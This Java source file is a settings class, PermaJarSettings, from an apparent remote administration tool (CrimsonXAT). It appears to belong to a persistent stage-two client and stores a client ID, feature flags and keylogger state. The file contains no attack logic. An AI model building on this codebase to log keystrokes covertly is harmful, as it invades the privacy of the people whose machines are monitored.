/*******************************************************************************
 *              Crimson Extended Administration Tool (CrimsonXAT)              *
 *                   Copyright (C) 2015 Subterranean Security                  *
 *                                                                             *
 *     This program is free software: you can redistribute it and/or modify    *
 *     it under the terms of the GNU General Public License as published by    *
 *      the Free Software Foundation, either version 3 of the License, or      *
 *                      (at your option) any later version.                    *
 *                                                                             *
 *       This program is distributed in the hope that it will be useful,       *
 *        but WITHOUT ANY WARRANTY; without even the implied warranty of       *
 *        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        *
 *                 GNU General Public License for more details.                *
 *                                                                             *
 *      You should have received a copy of the GNU General Public License      *
 *      along with this program.  If not, see http://www.gnu.org/licenses      *
 *******************************************************************************/
package subterranean.crimson.permajar.stage2;



import java.util.ArrayList;
import java.util.HashMap;

import subterranean.crimson.universal.containers.KeyloggerLog;
import subterranean.crimson.universal.containers.Settings;
import subterranean.crimson.universal.containers.SystemMessage;

public class PermaJarSettings extends Settings {

	private static final long serialVersionUID = 1L;
	public int clientID;
	public HashMap<String, Boolean> features;
	public KeyloggerLog keyloggerLog;
	public ArrayList<SystemMessage> messages;
	public int newChars;// for keylogger

	public PermaJarSettings() {
		infoId = 0;
		errorReporting = true;

		clientID = 0;
		keyloggerLog = new KeyloggerLog();
		features = new HashMap<String, Boolean>();
		newChars = 0;
		messages = new ArrayList<SystemMessage>();
		errorReportsSent = 0;
	}

}
